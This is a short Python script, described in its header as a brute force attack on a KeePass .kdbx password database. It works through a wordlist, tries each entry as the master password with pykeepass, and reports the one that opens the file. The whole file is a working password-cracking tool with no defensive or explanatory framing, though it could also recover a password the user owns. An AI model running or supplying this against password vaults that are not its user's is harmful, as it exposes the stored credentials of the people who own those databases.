'''
 ============================================================================
 Script to launch a brute force attack on a kdbx file
 
 Limits:
 Execution stops after a certain number of iterations
 Possible reasons:
 - RAM overloaded
 - Keepass security
 ============================================================================
'''
from pykeepass import PyKeePass
from colorama import Fore, Style
import os


def crack_kdbx(abs_path:str, words_list:str):
    """Run a bruteforce attack on a kdbx file """
    c = 1 # counter of tries
    good = None # loop invariant
    n = 0 # starting line if you can not run everything at once
    
    with open(os.path.abspath(f"words_lists/{words_list}.txt"), "r") as f:
        print(Fore.BLUE + "[INFO] Starting the attack")
        for i, line in enumerate(f):
            if i < n:  # allow the user to start from a certain line
                continue
            pswd = line.strip()
            c += 1
            if good is None:
                try:
                    with PyKeePass(abs_path, pswd):
                        print(f"{Fore.GREEN}[*] Password: {pswd} found after {c} tries{Style.RESET_ALL}")
                        good = pswd
                except:
                    print(f"{Fore.RED}[{c}] {pswd}{Style.RESET_ALL}")
            else:
                break


if __name__ == '__main__':
    file_name = 'weak_pwd'
    keepass_db = 'Passwords.kdbx'
    abs_path = os.path.abspath(keepass_db)

    crack_kdbx(abs_path, file_name)